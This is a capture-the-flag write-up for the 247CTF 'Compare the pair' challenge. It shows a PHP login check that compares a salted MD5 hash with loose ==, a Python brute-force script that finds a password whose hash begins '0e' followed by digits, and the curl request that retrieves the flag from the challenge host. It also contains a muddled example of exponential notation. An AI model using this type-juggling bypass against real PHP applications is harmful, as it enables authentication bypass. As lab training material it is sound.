Compare the pair

Source Code:

```
<?php
  require_once('flag.php');
  $password_hash = "0e902564435691274142490923013038";
  $salt = "f789bbc328a3d1a3";
  if(isset($_GET['password']) && md5($salt . $_GET['password']) == $password_hash){
    echo $flag;
  }
  echo highlight_file(__FILE__, true);
?>
```
password hash and salt is hardcoded

however salted so can't use the rainbow table

But this script is PHP so Possibily use type-juggling attack

password_hash: 0e902564435691274142490923013038
fake_hash    : 0e668271403484922599527929534016

PHP sees a number (0), followed by the letter "e", and it converts the MD5 string to exponential notation (e.g. 0462097431906509019562988736854).
Because both MD5 hashes start with "0e", they both evaluate to 0, making them numerically equivalent.

So if you can create a hash with 0e at the beginning, you should be able to get the flag.

create the script

```
import hashlib

salt = 'f789bbc328a3d1a3'
password = 0

while True:
    h = hashlib.md5(salt.encode() + str(password).encode()).hexdigest()
    if h[:2] == "0e" and h[2:].isdigit():
        print(h)
        print(password)
        break
    password += 1

```
```
->$ python3 test.py
0e668271403484922599527929534016
237701818
```
```
->$ curl https://090d72e83b8895b1.247ctf.com/?password=237701818 | grep 247CTF
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1821  100  1821    0     0   1565      0  0:00:01  0:00:01 --:--:--  1567
247CTF{XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX}<code><span style="color: #000000">
```



